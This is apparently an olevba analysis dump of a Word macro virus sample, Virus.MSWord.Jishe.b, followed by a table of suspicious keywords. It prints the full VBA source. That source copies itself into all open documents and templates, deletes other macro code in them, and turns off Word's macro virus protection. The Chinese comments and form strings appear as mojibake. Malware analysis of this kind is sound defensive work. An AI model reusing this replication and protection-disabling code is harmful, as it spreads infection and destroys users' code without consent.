olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO JiShenhua 
in file: Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d - OLE stream: 'JiShenhua'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'ÕâÊÇ±¾ÈËÑ§Ï°ÖÆ×÷µÄÒ»¸öºê²¡¶¾·ÀÉ±³ÌÐò,Ëü¿ÉÒÔ·ÀÖ¹²¿·ÖWORDºê²¡¶¾µÄ¸ÐÈ¾
'ÕâÐèÒªÓÐ´óÁ¿µÄºê²¡¶¾ÌØÕ÷Âë×÷ÎªÒÀ¾Ý,Èç¹ûÄã·¢ÏÖÓÐ±¾ÒßÃçÎÞÄÜÎªÁ¦µÄºê²¡¶¾
'¸ÐÐ»Äú¼°Ê±ÓëÎÒÁªÏµ,ÄãÒ²¿ÉÒÔ×ÔÑ¡ÐÞ¸Ä±¾³ÌÐò,ÒÔ¼ÓÇ¿±¾ÒßÃçµÄ¹¦Á¦
'Óë²¡¶¾×÷¶·Õù¾ÍÈçÍ¬µÖÓùÉç»á·¸×ï,ÐèÒª´ó¼ÒµÄ¹²Í¬Å¬Á¦
'»¶Ó­¼ÓÈëÆäÖÐ²¢³ÉÎªÒ»ÃûÕ½Ê¿,Ò²ÐíÄãÕýÊÇ´ó¼ÒÆÚ´ýÒÑ¾ÃµÄÓÂÊ¿
'³ÌÐòÉè¼Æ: ¼½É÷»ª
'°ì¹«µç»°:
'ÒÁÃÃµØÖ·: club@263.net
Option Explicit '³ÌÐòÖÐµÄ±äÁ¿±ØÐëÏÈ¶¨ÒåºóÊ¹ÓÃ
Public pVirusReport As String '²¡¶¾ÃèÊöÐÅÏ¢
Private Const cMyID As String = "MyMacroVirusKillerV2.0" '±¾³ÌÐò´úÂë±êÖ¾
Private Const cMyModule As String = "JiShenhua" '±¾³ÌÐòµÄÄ£¿éÃû³Æ
Private Const cMyUserForm As String = "VirusReport" '±¾³ÌÐòµÄÓÃ»§´°¿ÚÃû³Æ
Private Const cOK As Integer = 0 'Ò»ÇÐÕý³£
Private Const cDocHasModuleElse As Integer = 1 'ÓÐÆäËûÄ£¿é´æÔÚ
Private Const cDocHasCodeElse As Integer = 2 'ÔÚThisDocumentÄ£¿éÖÐÓÐÆäËû´úÂë´æÔÚ
Private Const cDocHasAllElse As Integer = 3 'ÔÚThisDocumentÄ£¿éÖÐÓÐÆäËû´úÂë´æÔÚ£¬²¢ÓÐÆäËûÄ£¿é´æÔÚ
Private Const cDocProtected As Integer = 4 '¸ÃÎÄµµ±»±£»¤
'´ÓÖ¸¶¨ÎÄ¼þÖÐÏòËùÓÐ´ò¿ªÎÄµµ¼°Ä£°åÖÐ¸´ÖÆ±¾³ÌÐò´úÂë¼°Ä£¿é
Public Function InfectAll() As Boolean
    Dim myDoc As Document, myTemp As Template
    'Ïò´ò¿ªµÄÎÄµµÖÐÐ´Èë±¾´úÂë
    For Each myDoc In Documents
        Infect myDoc
    Next myDoc
    'ÏòWORDÄ£°åÖÐÐ´Èë±¾´úÂë
    For Each myTemp In Templates
        Infect myTemp
    Next myTemp
    InfectAll = True
End Function
'Çå³ýËùÓÐ´ò¿ªÎÄµµ¼°Ä£°åÖÐµÄ²¡¶¾Ä£¿é¼°´úÂë
Public Function ClearVirus() As Boolean
    Dim i As Integer
    Dim myDoc As Document, myTemp As Template
    Dim Cleared As Boolean

    ClearVirus = True
    '¼ì²éËùÓÐÎÄµµ²¢Çå³ý
    For Each myDoc In Documents
        Cleared = ClearDocument(myDoc)
        If Not Cleared Then
            MsgBox "²¡¶¾Çå³ý¹¤×÷²»³É¹¦£¬Çë¼ì²éÔ­Òò¡£", vbOKOnly, myDoc.Name
            ClearVirus = False
        End If
    Next myDoc
    '¼ì²éËùÓÐÄ£°å²¢Çå³ý
    For Each myTemp In Templates
        Cleared = ClearDocument(myTemp)
        If Not Cleared Then
            MsgBox "²¡¶¾Çå³ý¹¤×÷²»³É¹¦£¬Çë¼ì²éÔ­Òò¡£", vbOKOnly, myTemp.Name
            ClearVirus = False
        End If
    Next myTemp
End Function
'¼ì²éËùÓÐ´ò¿ªµÄÎÄµµ¼°Ä£°åÖÐÊÇ·ñÓÐ²¡¶¾´æÔÚ£¬Èç¹ûÓÐ£¬·µ»Ø²¡¶¾ÐÅÏ¢ÃèÊö×Ö·û´®
Public Function ScanVirus() As Boolean
    Dim DocsCount As Integer, i As Integer, ret As Integer
    Dim myStr As String
    Dim myDoc As Document, myTemp As Template
    
    ScanVirus = False
    pVirusReport = ""
    '¼ì²éËùÓÐ´ò¿ªµÄÎÄµµÖÐÊÇ·ñÓÐ²¡¶¾
    For Each myDoc In Documents
        ret = ScanDocument(myDoc)
        Select Case ret
            Case cOK, cDocProtected
            Case cDocHasModuleElse, cDocHasCodeElse, cDocHasAllElse
                ScanVirus = True
            Case Else
                MsgBox "º¯ÊýScanDocument·µ»Ø´íÎó´úÂë£¬ÏµÍ³ÎÞ·¨Ê¶±ð¡£", vbOKOnly, "ÏµÍ³³ö´í"
        End Select
    Next myDoc
    '¼ì²éËùÓÐÄ£°å
    For Each myTemp In Templates
        ret = ScanDocument(myTemp)
        Select Case ret
            Case cOK, cDocProtected
            Case cDocHasModuleElse, cDocHasCodeElse, cDocHasAllElse
                ScanVirus = True
            Case Else
                MsgBox "º¯ÊýScanDocument·µ»Ø´íÎó´úÂë£¬ÏµÍ³ÎÞ·¨Ê¶±ð¡£", vbOKOnly, "ÏµÍ³³ö´í"
        End Select
    Next myTemp
End Function
'¹Ø±ÕWordºê²¡¶¾±£»¤¹¦ÄÜ
Public Function CloseVirusProtection(Optional Protected As Boolean = False)
    Options.VirusProtection = Protected
End Function
'°Ñ±¾³ÌÐò´úÂë´ÓÒ»¸öÎÄ¼þ¸´ÖÆµ½ÁíÒ»¸öÎÄ¼þÖÐ
Private Function Infect(TargetFile) As Boolean
    Dim xItem, CommandStr As String, file As String
    Dim myDoc As Document, myTemp As Template
    Dim LinesofCode As Long, myStr As String
    
    '¼ì²é²ÎÊýÀàÐÍÊÇ·ñÕýÈ·
    myStr = TypeName(TargetFile)
    If myStr <> "Document" And myStr <> "Template" Then
        MsgBox "Ê¹ÓÃÊý¾ÝÀàÐÍ" + myStr + "µ÷ÓÃº¯ÊýInfect£¬ÏµÍ³Ö»ÔÊÐíÊ¹ÓÃDocument¼°TemplateÀàÐÍ¡£", vbOKOnly, "ÏµÍ³´íÎó"
        Infect = False
        Exit Function
    End If
    Infect = True
    If TargetFile.Name = ThisDocument.Name Then Exit Function 'Ä¿±êÎÄ¼þÓëÔ´ÎÄ¼þÏàÍ¬Ê±²»Ö´ÐÐÐ´Èë²Ù×÷
    If Infected(TargetFile) Then Exit Function 'Ä¿±êÎÄ¼þÒÑ¾­´æÔÚ±¾³ÌÐò´úÂë
    If TargetFile.VBProject.Protection Then Exit Function 'Ä¿±êÎÄ¼þ±»±£»¤£¬²»ÄÜÖ´ÐÐÐ´Èë²Ù×÷
    Infect = False
    
    'Çå³ýÄ¿±êÎÄµµÖÐÒÑ¾­´æÔÚµÄÆäËûÄ£¿é¼°´úÂë
    For Each xItem In TargetFile.VBProject.VBComponents
        If xItem.Name = "ThisDocument" Then
            LinesofCode = xItem.CodeModule.CountOfLines
            If LinesofCode > 0 Then xItem.CodeModule.DeleteLines 1, LinesofCode
        Else
            TargetFile.VBProject.VBComponents.Remove xItem
        End If
    Next xItem
    
    'ÏòÎÄµµÖÐÐ´Èë±¾³ÌÐò´úÂë¼°Ä£¿é
    WordBasic.macrocopy ThisDocument.FullName + ":" + cMyModule, TargetFile.FullName + ":" + cMyModule
    WordBasic.macrocopy ThisDocument.FullName + ":" + cMyUserForm, TargetFile.FullName + ":" + cMyUserForm

    ' ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^
    
    '¸Ã³ÌÐò¶ÎÈç¹û·ÅÔÚÇ°Á½¸öÓï¾äÖ®Ç°£¬¾Í»áµ¼ÖÂVBA32.DLL³ÌÐò³öÏÖÖÂÃü´íÎó¶øËÀ»ú£¬
    'ÇîÎÒÖ®±ÏÉú±à³Ì¾­Ñé£¬²»ÖªºÎ¹Ê£¬ÌìÄÄ£¡ÌìÀíºÎÔÚ£¿
    
    LinesofCode = ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
    myStr = ThisDocument.VBProject.VBComponents(1).CodeModule.lines(1, LinesofCode)
    TargetFile.VBProject.VBComponents(1).CodeModule.InsertLines 1, myStr
    
    Infect = True
End Function
'¼ì²éÖ¸¶¨ÎÄµµÖÐÊÇ·ñÒÑ¾­ÓÐ±¾³ÌÐò´úÂë
Private Function Infected(TargetFile)
    Dim xItem, LinesofCode As Integer
    Dim HasVirus As Integer
    Dim myType As String
    
    myType = TypeName(TargetFile)
    If myType <> "Document" And myType <> "Template" Then
        MsgBox "Ê¹ÓÃÊý¾ÝÀàÐÍ" + myType + "µ÷ÓÃº¯ÊýInfected£¬ÏµÍ³Ö»ÔÊÐíÊ¹ÓÃDocument¼°TemplateÀàÐÍ¡£", vbOKOnly, "ÏµÍ³´íÎó"
        Infected = True
        Exit Function
    End If
    
    '¼ì²éÄ¿±êÎÄµµÊÇ·ñ±»±£»¤
    If TargetFile.VBProject.Protection Then
        Infected = True
        Exit Function
    End If
    
    'µ±ThisDocument,myModule,myUserForm¾ù´æÔÚÊ±£¬±íÊ¾¸ÃÎÄ¼þÒÑ¾­±»¸ÐÈ¾
    HasVirus = 0
    For Each xItem In TargetFile.VBProject.VBComponents
        If xItem.Name = "ThisDocument" Then
            LinesofCode = xItem.CodeModule.CountOfLines
            If (LinesofCode > 0) And (xItem.CodeModule.Find(cMyID, 1, 1, 1 + LinesofCode, 1)) Then
                HasVirus = HasVirus Or 1
            End If
        ElseIf xItem.Name = cMyModule Then
            HasVirus = HasVirus Or 2
        ElseIf xItem.Name = cMyUserForm Then
            HasVirus = HasVirus Or 4
        End If
    Next xItem
    If HasVirus = 7 Then
        Infected = True
    Else
        Infected = False
    End If
End Function
'¼ì²éÖ¸¶¨µÄ´ò¿ªÎÄµµ¼°Ä£°åÖÐÊÇ·ñÓÐ²¡¶¾´æÔÚ
Private Function ScanDocument(myDocOrTemp) As Integer
    Dim xItem, i As Integer, myStr As String
    Dim LinesofCode As Integer
    
    ScanDocument = cOK
    '¼ì²é²ÎÊýÀàÐÍÊÇ·ñÕýÈ·
    If TypeName(myDocOrTemp) <> "Document" And TypeName(myDocOrTemp) <> "Template" Then
        MsgBox "µ÷ÓÃº¯ÊýScanDocumentÖ»ÄÜÊ¹ÓÃDocument¼°TemplateÊý¾ÝÀàÐÍ¡£", vbOKOnly, "ÏµÍ³´íÎó"
        Exit Function
    End If
    myStr = myDocOrTemp.Name + "¼ì²é½á¹û£º" + Chr(10)
    '¼ì²é³ÌÐòÄ£¿éÊÇ·ñ±»±£»¤
    If myDocOrTemp.VBProject.Protection Then
        ScanDocument = cDocProtected
        myStr = myStr + "  ÎÄ¼þÖÐµÄ³ÌÐò´úÂë±»±£»¤£¬ÏµÍ³ÎÞ·¨×Ô¶¯²éÉ±£¬µ«Ò²¿ÉÄÜ´æÔÚ²¡¶¾£¬ÇëÐ¡ÐÄ£¡" + Chr(10)
        Exit Function
    End If
    For Each xItem In myDocOrTemp.VBProject.VBComponents
        If (xItem.Name = "ThisDocument") Then
            '´Ë²¿·ÖÓÐ´úÂëÊ±£¬Èç¹ûÕÒ²»µ½±¾Ä£¿é±êÖ¾ÔòÈÏ¶¨Îª²¡¶¾
            LinesofCode = xItem.CodeModule.CountOfLines
            If (LinesofCode > 0) And (Not xItem.CodeModule.Find(cMyID, 1, 1, 1 + LinesofCode, 1)) Then
                ScanDocument = ScanDocument Or cDocHasCodeElse
                myStr = myStr + "  <" + xItem.Name + ">¶ÔÏóÖÐÓÐÆäËû³ÌÐò´æÔÚ£¬´ó¸ÅÊÇ²¡¶¾¡£" + Chr(10)
            End If
        ElseIf (xItem.Name <> cMyModule) And (xItem.Name <> cMyUserForm) Then
            'ÎÄµµÖÐ³ý±¾Ä£¿é´úÂëÖ®Íâ£¬Èç¹û»¹ÓÐÆäËü´úÂëÔòÈÏ¶¨Îª²¡¶¾
            ScanDocument = ScanDocument Or cDocHasModuleElse
            myStr = myStr + "  ÓÐÆäËûÄ£¿é<" + xItem.Name + ">´æÔÚ£¬¼«ÓÐ¿ÉÄÜÊÇ²¡¶¾¡£" + Chr(10)
        End If
    Next
    If ScanDocument = cOK Then myStr = myStr + "  Ã»ÓÐ²¡¶¾£¬Çë·ÅÐÄÊ¹ÓÃ¡£" + Chr(10)
    pVirusReport = pVirusReport + myStr
End Function
'Çå³ýÖ¸¶¨µÄ´ò¿ªÎÄµµ¼°Ä£°åÖÐµÄ²¡¶¾Ä£¿é¼°´úÂë
Private Function ClearDocument(myDocOrTemp) As Boolean
    Dim xItem, LinesofCode As Integer
    
    ClearDocument = False
    '¼ì²é²ÎÊýÀàÐÍÊÇ·ñÕýÈ·
    If TypeName(myDocOrTemp) <> "Document" And TypeName(myDocOrTemp) <> "Template" Then
        MsgBox "µ÷ÓÃº¯ÊýClearDocumentÖ»ÄÜÊ¹ÓÃDocument¼°TemplateÊý¾ÝÀàÐÍ¡£", vbOKOnly, "ÏµÍ³´íÎó"
        Exit Function
    End If
    If myDocOrTemp.VBProject.Protection Then
        ClearDocument = True
        Exit Function
    End If
    '¼ì²éÎÄµµÊÇ·ñÓÐ²¡¶¾
    If ScanDocument(myDocOrTemp) Then
        For Each xItem In myDocOrTemp.VBProject.VBComponents
            If xItem.Name = "ThisDocument" Then
                LinesofCode = xItem.CodeModule.CountOfLines
                If (LinesofCode > 0) And (Not xItem.CodeModule.Find(cMyID, 1, 1, 1 + LinesofCode, 1)) Then
                    xItem.CodeModule.DeleteLines 1, LinesofCode
                End If
            ElseIf xItem.Name <> cMyModule And xItem.Name <> cMyUserForm Then
                myDocOrTemp.VBProject.VBComponents.Remove xItem
            End If
        Next
    End If
    ClearDocument = True
End Function
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�yr%`F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�s�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�e�N-N�S��	g 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[�u�k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[	g�S���[`O�v�e�N �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b4xOW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0�Y�g`Onx�Oُ�N�[eg�SN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�[`O�e(u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S�NhQ� Rd�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
yrdk�bJT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���yb:y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�QNaNS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}T�N`OhQCg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@gKN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`O�~+RN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qNSb�bJT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T;N�{Gl�b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��hV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1u�N
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonKill'" IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonNothing'" IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonOpenVisubasic'" IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox2'" IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Information'" IN 'Virus.MSWord.Jishe.b-ff32e1fa724e5a6ee52c3400aa8b4f4e1cf8ff6d' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

